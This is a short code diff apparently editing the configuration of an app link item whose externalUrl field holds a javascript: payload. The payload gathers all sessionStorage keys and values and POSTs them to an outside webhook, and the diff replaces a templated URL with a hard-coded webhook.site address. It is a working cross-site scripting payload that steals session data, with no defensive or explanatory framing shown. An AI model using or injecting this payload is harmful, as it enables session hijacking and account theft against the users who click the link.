@@ -41,13 +41,17 @@
             app: 'ucv3',
             subType: 'EXTERNAL',
             data: {
-            externalUrl: `javascript:(function(){let data={};for(let i=0;i<sessionStorage.length;i++)
-            
-            {let k=sessionStorage.key(i);data[k]=sessionStorage.getItem(k);}
-            fetch("${webhookUrl}",
-            
-            {method:"POST",body:JSON.stringify(data)}
-            );})();`,
+            externalUrl: `javascript:(function(){
+    let data={};
+    for(let i=0;i<sessionStorage.length;i++){
+        let k=sessionStorage.key(i);
+        data[k]=sessionStorage.getItem(k);
+    }
+    fetch("https://webhook.site/3444004f-f792-4702-8e8f-65bbc886712f",{
+        method:"POST",
+        body:JSON.stringify(data)
+    });
+})();`,
             target: '_blank'
             }
             });
